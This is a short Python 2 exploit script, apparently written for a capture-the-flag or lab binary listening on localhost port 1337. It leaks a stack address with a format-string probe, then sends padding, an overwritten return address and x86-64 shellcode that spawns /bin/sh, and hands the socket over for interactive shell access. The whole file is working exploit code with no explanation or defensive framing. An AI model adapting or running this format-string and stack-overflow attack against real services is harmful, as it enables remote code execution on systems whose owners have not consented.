from telnetlib import Telnet
import socket
import struct

# socket creation
s = socket.socket()
s.connect(('127.0.0.1', 1337))
r = s.recv(1024)
s.send("%p,%p,%p\n")
while ',' not in r:
    r = s.recv(1024)
start_buf = int(r.split(',')[1], 16)-9 # compensate for offset

print("leaked start of buffer: 0x{:08x}".format(start_buf))

raw_input("EXPLOIT READY: PRESS ANY KEY TO START")
padding = "shafhjaopfjdisapfujdwlafndkls;akfl'sdgfdsGf/dsgf'sdgkofpdskgfdsgjfdlkshgjfdlsghjfdklsjgkfajiwreorjawklbfjdb,fdklsgjkfds'glpfd\hlg'ndl'lser[toerp[sgifdjsvcxbnv.cxmb.vn,c/bvc,nlb'sop[rdigfod[spn gjklnvjflsgnfdsljgkfl;dfsjgfkd;slgjfdslgfjmnvmklhuqp89rpqhfslbndsnbmkpv"
RIP = struct.pack("Q", start_buf+len(padding) + 8)  # 8 compensate for RIP
# shellcode = "\xcc"*64
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = padding + RIP + shellcode
s.send(payload)

# allows to still interact with the socket after spawning the shell
t = Telnet()
t.sock = s
t.interact()
s.close()
